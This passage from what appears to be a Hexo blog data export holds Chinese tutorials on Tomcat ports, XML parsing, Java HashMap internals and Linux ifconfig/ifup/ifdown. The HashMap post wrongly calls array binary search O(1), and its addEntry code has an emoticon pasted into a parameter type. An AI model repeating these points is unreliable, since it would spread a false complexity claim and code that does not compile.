port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>AJP协议访问端口（默认为8009端口）<br>负责和其他的HTTP服务器建立连接。在把Tomcat与其他HTTP服务器集成时，就需要用到这个连接器。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- Define an AJP 1.3 Connector on port 8009 --&gt;&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure>\n<p>Web客户访问Tomcat服务器上JSP组件的两种方式如图所示。</p>\n<p><img src=\"Tomcat端口配置及原理详解/1.gif\" alt=\"\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Tomcat-端口配置，及原理详解\"><a href=\"#Tomcat-端口配置，及原理详解\" class=\"headerlink\" title=\"Tomcat 端口配置，及原理详解\"></a>Tomcat 端口配置，及原理详解</h4><p>如果想深入了解tomcat的各个端口及配置，建议通读文章，对初学者十分有利，整理自网络。</p>\n<p>Tomcat服务器需配置三个端口才能启动，安装时默认启用了这三个端口，当要运行多个tomcat服务时需要修改这三个端口，不能相同。端口配置路径为tomcat\\ conf\\service.xml</p>\n<p>修改Shutdown端口（默认为8005端口）<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Server port=&quot;8005&quot; shutdown=&quot;SHUTDOWN&quot;&gt;</span><br></pre></td></tr></table></figure></p>\n<p>修改http访问端口（默认为8080端口）<br>负责建立HTTP连接。在通过浏览器访问Tomcat服务器的Web应用时，使用的就是这个连接器。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt;&lt;!-- A &quot;Connector&quot; using the shared thread pool--&gt;&lt;!-- &lt;Connector executor=&quot;tomcatThreadPool&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>AJP协议访问端口（默认为8009端口）<br>负责和其他的HTTP服务器建立连接。在把Tomcat与其他HTTP服务器集成时，就需要用到这个连接器。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- Define an AJP 1.3 Connector on port 8009 --&gt;&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure>\n<p>Web客户访问Tomcat服务器上JSP组件的两种方式如图所示。</p>\n<p><img src=\"Tomcat端口配置及原理详解/1.gif\" alt=\"\"></p>\n"},{"title":"XML解析思路","date":"2016-04-11T23:24:47.000Z","_content":"### XML解析思路\n&emsp;&emsp;XML解析的思想可以分为两类:DOM解析和SAX解析\n          \n#### DOM解析:\n&emsp;&emsp;Dom解析是一次性把整个文档加载到内存中形成一个Dom树,然后再操作DOM树,可以对XML进行增删改查,但是消耗内存比较大\n\n#### SAX解析:\n&emsp;&emsp;SAX解析是基于事件驱动函数回调机制,每每读取一小部分的数据就会进行事件回调处理,但是不能修改删除数据,只能查询数据","source":"_posts/XML解析思路.md","raw":"---\ntitle: XML解析思路\ndate: 2016-04-12 07:24:47\ntags: XML\n---\n### XML解析思路\n&emsp;&emsp;XML解析的思想可以分为两类:DOM解析和SAX解析\n          \n#### DOM解析:\n&emsp;&emsp;Dom解析是一次性把整个文档加载到内存中形成一个Dom树,然后再操作DOM树,可以对XML进行增删改查,但是消耗内存比较大\n\n#### SAX解析:\n&emsp;&emsp;SAX解析是基于事件驱动函数回调机制,每每读取一小部分的数据就会进行事件回调处理,但是不能修改删除数据,只能查询数据","slug":"XML解析思路","published":1,"updated":"2018-01-31T05:24:06.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44two002fmfahtmppps4z","content":"<h3 id=\"XML解析思路\"><a href=\"#XML解析思路\" class=\"headerlink\" title=\"XML解析思路\"></a>XML解析思路</h3><p>&emsp;&emsp;XML解析的思想可以分为两类:DOM解析和SAX解析</p>\n<h4 id=\"DOM解析\"><a href=\"#DOM解析\" class=\"headerlink\" title=\"DOM解析:\"></a>DOM解析:</h4><p>&emsp;&emsp;Dom解析是一次性把整个文档加载到内存中形成一个Dom树,然后再操作DOM树,可以对XML进行增删改查,但是消耗内存比较大</p>\n<h4 id=\"SAX解析\"><a href=\"#SAX解析\" class=\"headerlink\" title=\"SAX解析:\"></a>SAX解析:</h4><p>&emsp;&emsp;SAX解析是基于事件驱动函数回调机制,每每读取一小部分的数据就会进行事件回调处理,但是不能修改删除数据,只能查询数据</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"XML解析思路\"><a href=\"#XML解析思路\" class=\"headerlink\" title=\"XML解析思路\"></a>XML解析思路</h3><p>&emsp;&emsp;XML解析的思想可以分为两类:DOM解析和SAX解析</p>\n<h4 id=\"DOM解析\"><a href=\"#DOM解析\" class=\"headerlink\" title=\"DOM解析:\"></a>DOM解析:</h4><p>&emsp;&emsp;Dom解析是一次性把整个文档加载到内存中形成一个Dom树,然后再操作DOM树,可以对XML进行增删改查,但是消耗内存比较大</p>\n<h4 id=\"SAX解析\"><a href=\"#SAX解析\" class=\"headerlink\" title=\"SAX解析:\"></a>SAX解析:</h4><p>&emsp;&emsp;SAX解析是基于事件驱动函数回调机制,每每读取一小部分的数据就会进行事件回调处理,但是不能修改删除数据,只能查询数据</p>\n"},{"title":"hashmap数据结构","date":"2014-11-22T07:47:51.000Z","_content":"**hashmap的数据结构**是由数组和链表来实现，但这两种数据结构基本上是两个极端。\n**数组**：数组存储区间是连续的，占用内存严重，故空间复杂的很大。但数组的二分查找时间复杂度小，为O(1)；数组的特点是：寻址容易，插入和删除困难；\n**链表**：链表存储区间离散，占用内存比较宽松，故空间复杂度很小，但时间复杂度很大，达O（N）。链表的特点是：寻址困难，插入和删除容易。哈希表那么我们能不能综合两者的特性，做出一种寻址容易，插入删除也容易的数据结构？答案是肯定的，这就是我们要提起的哈希表。哈希表（(Hash table）既满足了数据的查找方便，同时不占用太多的内容空间，使用也十分方便。哈希表有多种不同的实现方法，我接下来解释的是最常用的一种方法—— 拉链法，我们可以理解为“链表的数组” ，如图：\n![JavaSE](hashmap数据结构/1.jpeg)\n从上图我们可以发现哈希表是由【数组+链表】组成的，一个长度为16的数组中，每个元素存储的是一个链表的头结点。那么这些元素是按照什么样的规则存储到数组中呢？一般情况是通过【hash(key)%len】获得，也就是元素的key的哈希值对数组长度取模得到。比如上述哈希表中，12%16=12,28%16=12,108%16=12,140%16=12。所以12、28、108以及140都存储在数组下标为12的位置。HashMap也可以理解为其存储数据的容器就是一个【线性数组】。这可能让我们很不解，一个线性的数组怎么实现按键值对来存取数据呢？这里HashMap有做一些处理。首先HashMap里面实现一个静态内部类Entry，其重要的属性有 key , value, next。从属性key,value我们就能很明显的看出来Entry就是HashMap键值对实现的一个基础bean，我们上面说到HashMap的基础就是一个线性数组，这个数组就是Entry[]，Map里面的内容都保存在Entry[]里面。/** The table, resized as necessary. Length MUST Always be a power of two. */transient Entry[] table;\n\n存储逻辑: \n既然是线性数组，为什么能随机存取？这里HashMap用了一个小算法，大致是这样实现：\n//存储时:\nint hash = key.hashCode(); // 每个key的hash是一个固定的int值int index = hash % Entry[].length;// 去模运算，运算后的值肯定在0-length之间Entry[index] = value;// 以去模后的值为索引，把value存进去疑问：如果两个key通过hash%Entry[].length得到的index相同，会不会有覆盖的危险？这里HashMap里面用到链式数据结构的一个概念。上面我们提到过Entry类里面有一个next属性，作用是指向下一个Entry。打个比方， 第一个键值对A进来，通过计算其key的hash得到的index=0，记做:Entry[0] = A。一会后又进来一个键值对B，通过计算其index也等于0，现在怎么办？HashMap会这样做:B.next = A,Entry[0] = B。如果又进来C,index也等于0,那么C.next = B,Entry[0] = C；这样我们发现index=0的地方其实存取了A,B,C三个键值对,他们通过next这个属性链接在一起。\n\n\tpublic V put(K key, V value) {\n\t\t if (key == null) {\n\t\t \treturn putForNullKey(value); //null总是放在数组的第一个链表中 \n\t\t }\n\t\t int hash = hash(key.hashCode());\n\t\t int i = indexFor(hash, table.length);        //遍历链表\n\t\t for (Entry<K, V> e = table[i]; e != null; e = e.next) {\n\t\t\t Object k;            //如果key在链表中已存在，则替换为新value（不要误解为是用新的值把旧的值覆盖了！）\n\t\t\t  if (e.hash == hash && ((k = e.key) == key || key.equals(k))){\n\t\t\t\t  V oldValue = e.value;\n\t\t\t\t  e.value = value;\n\t\t\t\t  e.recordAccess(this);\n\t\t\t\t  return oldValue;\n\t\t\t  }\n\t\t  }\n\t\t  modCount++;\n\t\t  addEntry(hash, key, value, i);\n\t\t  return null;\n\t}\n\t\n\tvoid addEntry(int hash, K key, V value, intO(∩_∩)O bucketIndex) {\n\t\tEntry<K, V> e = table[bucketIndex];\n\t\ttable[bucketIndex] = new Entry<K, V>(hash, key, value, e); //参数e, 是Entry.next\n\t\t//如果size超过threshold，则扩充table大小。再散列\n\t\tif (size++ >= threshold) resize(2 * table.length);\n\t}\n   \n   \n   当然HashMap里面也包含一些优化方面的实现，比如：Entry[]的长度一定后，随着map里面数据的越来越长，这样同一个index的链就会很长，会不会影响性能？HashMap里面设置一个因子，随着map的size越来越大，Entry[]会以一定的规则加长长度。\n  \n  \n  \n  \n  ","source":"_posts/hashmap数据结构.md","raw":"---\ntitle: hashmap数据结构\ndate: 2014-11-22 15:47:51\ntags: JavaSE\n---\n**hashmap的数据结构**是由数组和链表来实现，但这两种数据结构基本上是两个极端。\n**数组**：数组存储区间是连续的，占用内存严重，故空间复杂的很大。但数组的二分查找时间复杂度小，为O(1)；数组的特点是：寻址容易，插入和删除困难；\n**链表**：链表存储区间离散，占用内存比较宽松，故空间复杂度很小，但时间复杂度很大，达O（N）。链表的特点是：寻址困难，插入和删除容易。哈希表那么我们能不能综合两者的特性，做出一种寻址容易，插入删除也容易的数据结构？答案是肯定的，这就是我们要提起的哈希表。哈希表（(Hash table）既满足了数据的查找方便，同时不占用太多的内容空间，使用也十分方便。哈希表有多种不同的实现方法，我接下来解释的是最常用的一种方法—— 拉链法，我们可以理解为“链表的数组” ，如图：\n![JavaSE](hashmap数据结构/1.jpeg)\n从上图我们可以发现哈希表是由【数组+链表】组成的，一个长度为16的数组中，每个元素存储的是一个链表的头结点。那么这些元素是按照什么样的规则存储到数组中呢？一般情况是通过【hash(key)%len】获得，也就是元素的key的哈希值对数组长度取模得到。比如上述哈希表中，12%16=12,28%16=12,108%16=12,140%16=12。所以12、28、108以及140都存储在数组下标为12的位置。HashMap也可以理解为其存储数据的容器就是一个【线性数组】。这可能让我们很不解，一个线性的数组怎么实现按键值对来存取数据呢？这里HashMap有做一些处理。首先HashMap里面实现一个静态内部类Entry，其重要的属性有 key , value, next。从属性key,value我们就能很明显的看出来Entry就是HashMap键值对实现的一个基础bean，我们上面说到HashMap的基础就是一个线性数组，这个数组就是Entry[]，Map里面的内容都保存在Entry[]里面。/** The table, resized as necessary. Length MUST Always be a power of two. */transient Entry[] table;\n\n存储逻辑: \n既然是线性数组，为什么能随机存取？这里HashMap用了一个小算法，大致是这样实现：\n//存储时:\nint hash = key.hashCode(); // 每个key的hash是一个固定的int值int index = hash % Entry[].length;// 去模运算，运算后的值肯定在0-length之间Entry[index] = value;// 以去模后的值为索引，把value存进去疑问：如果两个key通过hash%Entry[].length得到的index相同，会不会有覆盖的危险？这里HashMap里面用到链式数据结构的一个概念。上面我们提到过Entry类里面有一个next属性，作用是指向下一个Entry。打个比方， 第一个键值对A进来，通过计算其key的hash得到的index=0，记做:Entry[0] = A。一会后又进来一个键值对B，通过计算其index也等于0，现在怎么办？HashMap会这样做:B.next = A,Entry[0] = B。如果又进来C,index也等于0,那么C.next = B,Entry[0] = C；这样我们发现index=0的地方其实存取了A,B,C三个键值对,他们通过next这个属性链接在一起。\n\n\tpublic V put(K key, V value) {\n\t\t if (key == null) {\n\t\t \treturn putForNullKey(value); //null总是放在数组的第一个链表中 \n\t\t }\n\t\t int hash = hash(key.hashCode());\n\t\t int i = indexFor(hash, table.length);        //遍历链表\n\t\t for (Entry<K, V> e = table[i]; e != null; e = e.next) {\n\t\t\t Object k;            //如果key在链表中已存在，则替换为新value（不要误解为是用新的值把旧的值覆盖了！）\n\t\t\t  if (e.hash == hash && ((k = e.key) == key || key.equals(k))){\n\t\t\t\t  V oldValue = e.value;\n\t\t\t\t  e.value = value;\n\t\t\t\t  e.recordAccess(this);\n\t\t\t\t  return oldValue;\n\t\t\t  }\n\t\t  }\n\t\t  modCount++;\n\t\t  addEntry(hash, key, value, i);\n\t\t  return null;\n\t}\n\t\n\tvoid addEntry(int hash, K key, V value, intO(∩_∩)O bucketIndex) {\n\t\tEntry<K, V> e = table[bucketIndex];\n\t\ttable[bucketIndex] = new Entry<K, V>(hash, key, value, e); //参数e, 是Entry.next\n\t\t//如果size超过threshold，则扩充table大小。再散列\n\t\tif (size++ >= threshold) resize(2 * table.length);\n\t}\n   \n   \n   当然HashMap里面也包含一些优化方面的实现，比如：Entry[]的长度一定后，随着map里面数据的越来越长，这样同一个index的链就会很长，会不会影响性能？HashMap里面设置一个因子，随着map的size越来越大，Entry[]会以一定的规则加长长度。\n  \n  \n  \n  \n  ","slug":"hashmap数据结构","published":1,"updated":"2018-01-31T08:05:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twp002hmfahftdro4ws","content":"<p><strong>hashmap的数据结构</strong>是由数组和链表来实现，但这两种数据结构基本上是两个极端。<br><strong>数组</strong>：数组存储区间是连续的，占用内存严重，故空间复杂的很大。但数组的二分查找时间复杂度小，为O(1)；数组的特点是：寻址容易，插入和删除困难；<br><strong>链表</strong>：链表存储区间离散，占用内存比较宽松，故空间复杂度很小，但时间复杂度很大，达O（N）。链表的特点是：寻址困难，插入和删除容易。哈希表那么我们能不能综合两者的特性，做出一种寻址容易，插入删除也容易的数据结构？答案是肯定的，这就是我们要提起的哈希表。哈希表（(Hash table）既满足了数据的查找方便，同时不占用太多的内容空间，使用也十分方便。哈希表有多种不同的实现方法，我接下来解释的是最常用的一种方法—— 拉链法，我们可以理解为“链表的数组” ，如图：<br><img src=\"hashmap数据结构/1.jpeg\" alt=\"JavaSE\"><br>从上图我们可以发现哈希表是由【数组+链表】组成的，一个长度为16的数组中，每个元素存储的是一个链表的头结点。那么这些元素是按照什么样的规则存储到数组中呢？一般情况是通过【hash(key)%len】获得，也就是元素的key的哈希值对数组长度取模得到。比如上述哈希表中，12%16=12,28%16=12,108%16=12,140%16=12。所以12、28、108以及140都存储在数组下标为12的位置。HashMap也可以理解为其存储数据的容器就是一个【线性数组】。这可能让我们很不解，一个线性的数组怎么实现按键值对来存取数据呢？这里HashMap有做一些处理。首先HashMap里面实现一个静态内部类Entry，其重要的属性有 key , value, next。从属性key,value我们就能很明显的看出来Entry就是HashMap键值对实现的一个基础bean，我们上面说到HashMap的基础就是一个线性数组，这个数组就是Entry[]，Map里面的内容都保存在Entry[]里面。/*<em> The table, resized as necessary. Length MUST Always be a power of two. </em>/transient Entry[] table;</p>\n<p>存储逻辑:<br>既然是线性数组，为什么能随机存取？这里HashMap用了一个小算法，大致是这样实现：<br>//存储时:<br>int hash = key.hashCode(); // 每个key的hash是一个固定的int值int index = hash % Entry[].length;// 去模运算，运算后的值肯定在0-length之间Entry[index] = value;// 以去模后的值为索引，把value存进去疑问：如果两个key通过hash%Entry[].length得到的index相同，会不会有覆盖的危险？这里HashMap里面用到链式数据结构的一个概念。上面我们提到过Entry类里面有一个next属性，作用是指向下一个Entry。打个比方， 第一个键值对A进来，通过计算其key的hash得到的index=0，记做:Entry[0] = A。一会后又进来一个键值对B，通过计算其index也等于0，现在怎么办？HashMap会这样做:B.next = A,Entry[0] = B。如果又进来C,index也等于0,那么C.next = B,Entry[0] = C；这样我们发现index=0的地方其实存取了A,B,C三个键值对,他们通过next这个属性链接在一起。</p>\n<pre><code>public V put(K key, V value) {\n     if (key == null) {\n         return putForNullKey(value); //null总是放在数组的第一个链表中 \n     }\n     int hash = hash(key.hashCode());\n     int i = indexFor(hash, table.length);        //遍历链表\n     for (Entry&lt;K, V&gt; e = table[i]; e != null; e = e.next) {\n         Object k;            //如果key在链表中已存在，则替换为新value（不要误解为是用新的值把旧的值覆盖了！）\n          if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))){\n              V oldValue = e.value;\n              e.value = value;\n              e.recordAccess(this);\n              return oldValue;\n          }\n      }\n      modCount++;\n      addEntry(hash, key, value, i);\n      return null;\n}\n\nvoid addEntry(int hash, K key, V value, intO(∩_∩)O bucketIndex) {\n    Entry&lt;K, V&gt; e = table[bucketIndex];\n    table[bucketIndex] = new Entry&lt;K, V&gt;(hash, key, value, e); //参数e, 是Entry.next\n    //如果size超过threshold，则扩充table大小。再散列\n    if (size++ &gt;= threshold) resize(2 * table.length);\n}\n</code></pre><p>   当然HashMap里面也包含一些优化方面的实现，比如：Entry[]的长度一定后，随着map里面数据的越来越长，这样同一个index的链就会很长，会不会影响性能？HashMap里面设置一个因子，随着map的size越来越大，Entry[]会以一定的规则加长长度。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>hashmap的数据结构</strong>是由数组和链表来实现，但这两种数据结构基本上是两个极端。<br><strong>数组</strong>：数组存储区间是连续的，占用内存严重，故空间复杂的很大。但数组的二分查找时间复杂度小，为O(1)；数组的特点是：寻址容易，插入和删除困难；<br><strong>链表</strong>：链表存储区间离散，占用内存比较宽松，故空间复杂度很小，但时间复杂度很大，达O（N）。链表的特点是：寻址困难，插入和删除容易。哈希表那么我们能不能综合两者的特性，做出一种寻址容易，插入删除也容易的数据结构？答案是肯定的，这就是我们要提起的哈希表。哈希表（(Hash table）既满足了数据的查找方便，同时不占用太多的内容空间，使用也十分方便。哈希表有多种不同的实现方法，我接下来解释的是最常用的一种方法—— 拉链法，我们可以理解为“链表的数组” ，如图：<br><img src=\"hashmap数据结构/1.jpeg\" alt=\"JavaSE\"><br>从上图我们可以发现哈希表是由【数组+链表】组成的，一个长度为16的数组中，每个元素存储的是一个链表的头结点。那么这些元素是按照什么样的规则存储到数组中呢？一般情况是通过【hash(key)%len】获得，也就是元素的key的哈希值对数组长度取模得到。比如上述哈希表中，12%16=12,28%16=12,108%16=12,140%16=12。所以12、28、108以及140都存储在数组下标为12的位置。HashMap也可以理解为其存储数据的容器就是一个【线性数组】。这可能让我们很不解，一个线性的数组怎么实现按键值对来存取数据呢？这里HashMap有做一些处理。首先HashMap里面实现一个静态内部类Entry，其重要的属性有 key , value, next。从属性key,value我们就能很明显的看出来Entry就是HashMap键值对实现的一个基础bean，我们上面说到HashMap的基础就是一个线性数组，这个数组就是Entry[]，Map里面的内容都保存在Entry[]里面。/*<em> The table, resized as necessary. Length MUST Always be a power of two. </em>/transient Entry[] table;</p>\n<p>存储逻辑:<br>既然是线性数组，为什么能随机存取？这里HashMap用了一个小算法，大致是这样实现：<br>//存储时:<br>int hash = key.hashCode(); // 每个key的hash是一个固定的int值int index = hash % Entry[].length;// 去模运算，运算后的值肯定在0-length之间Entry[index] = value;// 以去模后的值为索引，把value存进去疑问：如果两个key通过hash%Entry[].length得到的index相同，会不会有覆盖的危险？这里HashMap里面用到链式数据结构的一个概念。上面我们提到过Entry类里面有一个next属性，作用是指向下一个Entry。打个比方， 第一个键值对A进来，通过计算其key的hash得到的index=0，记做:Entry[0] = A。一会后又进来一个键值对B，通过计算其index也等于0，现在怎么办？HashMap会这样做:B.next = A,Entry[0] = B。如果又进来C,index也等于0,那么C.next = B,Entry[0] = C；这样我们发现index=0的地方其实存取了A,B,C三个键值对,他们通过next这个属性链接在一起。</p>\n<pre><code>public V put(K key, V value) {\n     if (key == null) {\n         return putForNullKey(value); //null总是放在数组的第一个链表中 \n     }\n     int hash = hash(key.hashCode());\n     int i = indexFor(hash, table.length);        //遍历链表\n     for (Entry&lt;K, V&gt; e = table[i]; e != null; e = e.next) {\n         Object k;            //如果key在链表中已存在，则替换为新value（不要误解为是用新的值把旧的值覆盖了！）\n          if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))){\n              V oldValue = e.value;\n              e.value = value;\n              e.recordAccess(this);\n              return oldValue;\n          }\n      }\n      modCount++;\n      addEntry(hash, key, value, i);\n      return null;\n}\n\nvoid addEntry(int hash, K key, V value, intO(∩_∩)O bucketIndex) {\n    Entry&lt;K, V&gt; e = table[bucketIndex];\n    table[bucketIndex] = new Entry&lt;K, V&gt;(hash, key, value, e); //参数e, 是Entry.next\n    //如果size超过threshold，则扩充table大小。再散列\n    if (size++ &gt;= threshold) resize(2 * table.length);\n}\n</code></pre><p>   当然HashMap里面也包含一些优化方面的实现，比如：Entry[]的长度一定后，随着map里面数据的越来越长，这样同一个index的链就会很长，会不会影响性能？HashMap里面设置一个因子，随着map的size越来越大，Entry[]会以一定的规则加长长度。</p>\n"},{"title":"ifconfig、ifup、ifdown的用法","date":"2018-01-30T08:36:30.000Z","_content":"\n**ifconfig**\n\n\tifconfig 主要是可以手动的启动、观察与修改网络接口的相关参数，可以修改的参数很多，包括 IP 参数以及 MTU 等等都可以修改.对应的配置文件为/etc/sysconfig/network-scripts/ifcfg-ethx\n\tifconfig {interface} {up|down}  <== 观察与启动接口\n\tifconfig interface {options}    <== 设定与修改接口\n\t选项与参数：\n\tinterface：网络卡接口代号，包括 eth0, eth1, ppp0 等等\n\toptions  ：可以接的参数，包括如下：\n\tup, down ：启动 (up) 或关闭 (down) 该网络接口(不涉及任何参数)\n\tmtu      ：可以设定不同的 MTU 数值，例如 mtu 1500 (单位为 byte)\n\tnetmask  ：就是子屏蔽网络；\n\tbroadcast：就是广播地址啊\n\t[root@redhat6 ~]# ifconfig\n\teth0      Link encap:Ethernet  HWaddr 08:00:27:4C:C5:88 \n\tinet addr:192.168.1.217  Bcast:192.168.1.255  Mask:255.255.255.0\n\tinet6 addr: fe80::a00:27ff:fe4c:c588/64 Scope:Link\n\tUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n\tRX packets:218811 errors:0 dropped:0 overruns:0 frame:0\n\tTX packets:85 errors:0 dropped:0 overruns:0 carrier:0\n\tcollisions:0 txqueuelen:1000\n\tRX bytes:14322456 (13.6 MiB)  TX bytes:11859 (11.5 KiB)\n\t\n \n上面出现的各项数据是这样的(数据排列由上而下、由左而右)：\n\n\teth0：就是网络卡的代号，也有 lo 这个 loopback ；\n\tHWaddr：就是网络卡的硬件地址，俗称的 MAC 是也；\n\tinet addr：IPv4 的 IP 地址，后续的 Bcast, Mask 分别代表的是 Broadcast 与 netmask 喔！\n\tinet6 addr：是 IPv6 的版本的 IP ，我们没有使用，所以略过；\n\tMTU：就是第二章谈到的 MTU 啊！\n\tRX：那一行代表的是网络由启动到目前为止的封包接收情况， packets 代表封包数、errors 代表封包发生错误的数量、 dropped 代表封包由于有问题而遭丢弃的数量等等\n\tTX：与 RX 相反，为网络由启动到目前为止的传送情况；\n\tcollisions：代表封包碰撞的情况，如果发生太多次， 表示你的网络状况不太好；\n\ttxqueuelen：代表用来传输数据的缓冲区的储存长度；\n\tRX bytes, TX bytes：总接收、发送字节总量\n\n\t透过观察上述的资料，大致上可以了解到你的网络情况，尤其是那个RX, TX 内的 error 数量，以及是否发生严重的collision 情况，都是需要注意的喔！\n\t临时修改网络参数：ifconfig eth0 192.168.1.217 netmask 255.255.255.0 broadcast 192.168.1.255\n\t启动、关闭网卡：ifconfig eth0 up/down\n\t查看DNS地址：cat /etc/resolv.conf\n\t重启网络服务：/etc/init.d/network restart\n \n **ifup、ifdown**\n\n\tifup   {interface}\n\tifdown {interface}\n\t这2个程序主要是搜寻/etc/sysconfig/network-scripts目录下的配置文件 (ifcfg-ethx) 来进行启动与关闭的， 所以在使用前请确定 ifcfg-ethx 是否真的存在于正确的目录内，否则会启动失败喔！ 另外，如果以 ifconfig eth0 .... 来设定或者是修改了网络接口后， 那就无法再以 ifdown eth0 的方式来关闭了！因为 ifdown 会分析比对目前的网络参数与ifcfg-eth0 是否相符，不符的话，就会放弃该次动作。因此，使用 ifconfig 修改完毕后，应该要以 ifconfig eth0 down 才能够关闭该接口喔。","source":"_posts/ifconfig、ifup、ifdown的用法.md","raw":"---\ntitle: ifconfig、ifup、ifdown的用法\ndate: 2018-01-30 16:36:30\ntags: Linux\n---\n\n**ifconfig**\n\n\tifconfig 主要是可以手动的启动、观察与修改网络接口的相关参数，可以修改的参数很多，包括 IP 参数以及 MTU 等等都可以修改.对应的配置文件为/etc/sysconfig/network-scripts/ifcfg-ethx\n\tifconfig {interface} {up|down}  <== 观察与启动接口\n\tifconfig interface {options}    <== 设定与修改接口\n\t选项与参数：\n\tinterface：网络卡接口代号，包括 eth0, eth1, ppp0 等等\n\toptions  ：可以接的参数，包括如下：\n\tup, down ：启动 (up) 或关闭 (down) 该网络接口(不涉及任何参数)\n\tmtu      ：可以设定不同的 MTU 数值，例如 mtu 1500 (单位为 byte)\n\tnetmask  ：就是子屏蔽网络；\n\tbroadcast：就是广播地址啊\n\t[root@redhat6 ~]# ifconfig\n\teth0      Link encap:Ethernet  HWaddr 08:00:27:4C:C5:88 \n\tinet addr:192.168.1.217  Bcast:192.168.1.255  Mask:255.255.255.0\n\tinet6 addr: fe80::a00:27ff:fe4c:c588/64 Scope:Link\n\tUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n\tRX packets:218811 errors:0 dropped:0 overruns:0 frame:0\n\tTX packets:85 errors:0 dropped:0 overruns:0 carrier:0\n\tcollisions:0 txqueuelen:1000\n\tRX bytes:14322456 (13.6 MiB)  TX bytes:11859 (11.5 KiB)\n\t\n \n上面出现的各项数据是这样的(数据排列由上而下、由左而右)：\n\n\teth0：就是网络卡的代号，也有 lo 这个 loopback ；\n\tHWaddr：就是网络卡的硬件地址，俗称的 MAC 是也；\n\tinet addr：IPv4 的 IP 地址，后续的 Bcast, Mask 分别代表的是 Broadcast 与 netmask 喔！\n\tinet6 addr：是 IPv6 的版本的 IP ，我们没有使用，所以略过；\n\tMTU：就是第二章谈到的 MTU 啊！\n\tRX：那一行代表的是网络由启动到目前为止的封包接收情况， packets 代表封包数、errors 代表封包发生错误的数量、 dropped 代表封包由于有问题而遭丢弃的数量等等\n\tTX：与 RX 相反，为网络由启动到目前为止的传送情况；\n\tcollisions：代表封包碰撞的情况，如果发生太多次， 表示你的网络状况不太好；\n\ttxqueuelen：代表用来传输数据的缓冲区的储存长度；\n\tRX bytes, TX bytes：总接收、发送字节总量\n\n\t透过观察上述的资料，大致上可以了解到你的网络情况，尤其是那个RX, TX 内的 error 数量，以及是否发生严重的collision 情况，都是需要注意的喔！\n\t临时修改网络参数：ifconfig eth0 192.168.1.217 netmask 255.255.255.0 broadcast 192.168.1.255\n\t启动、关闭网卡：ifconfig eth0 up/down\n\t查看DNS地址：cat /etc/resolv.conf\n\t重启网络服务：/etc/init.d/network restart\n \n **ifup、ifdown**\n\n\tifup   {interface}\n\tifdown {interface}\n\t这2个程序主要是搜寻/etc/sysconfig/network-scripts目录下的配置文件 (ifcfg-ethx) 来进行启动与关闭的， 所以在使用前请确定 ifcfg-ethx 是否真的存在于正确的目录内，否则会启动失败喔！ 另外，如果以 ifconfig eth0 .... 来设定或者是修改了网络接口后， 那就无法再以 ifdown eth0 的方式来关闭了！因为 ifdown 会分析比对目前的网络参数与ifcfg-eth0 是否相符，不符的话，就会放弃该次动作。因此，使用 ifconfig 修改完毕后，应该要以 ifconfig eth0 down 才能够关闭该接口喔。","slug":"ifconfig、ifup、ifdown的用法","published":1,"updated":"2018-01-31T05:36:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twq002jmfahiq8trkr5","content":"<p><strong>ifconfig</strong></p>\n<pre><code>ifconfig 主要是可以手动的启动、观察与修改网络接口的相关参数，可以修改的参数很多，包括 IP 参数以及 MTU 等等都可以修改.对应的配置文件为/etc/sysconfig/network-scripts/ifcfg-ethx\nifconfig {interface} {up|down}  &lt;== 观察与启动接口\nifconfig interface {options}    &lt;== 设定与修改接口\n选项与参数：\ninterface：网络卡接口代号，包括 eth0, eth1, ppp0 等等\noptions  ：可以接的参数，包括如下：\nup, down ：启动 (up) 或关闭 (down) 该网络接口(不涉及任何参数)\nmtu      ：可以设定不同的 MTU 数值，例如 mtu 1500 (单位为 byte)\nnetmask  ：就是子屏蔽网络；\nbroadcast：就是广播地址啊\n[root@redhat6 ~]# ifconfig\neth0      Link encap:Ethernet  HWaddr 08:00:27:4C:C5:88 \ninet addr:192.168.1.217  Bcast:192.168.1.255  Mask:255.255.255.0\ninet6 addr: fe80::a00:27ff:fe4c:c588/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\nRX packets:218811 errors:0 dropped:0 overruns:0 frame:0\nTX packets:85 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:14322456 (13.6 MiB)  TX bytes:11859 (11.5 KiB)\n</code></pre><p>上面出现的各项数据是这样的(数据排列由上而下、由左而右)：</p>\n<pre><code>eth0：就是网络卡的代号，也有 lo 这个 loopback ；\nHWaddr：就是网络卡的硬件地址，俗称的 MAC 是也；\ninet addr：IPv4 的 IP 地址，后续的 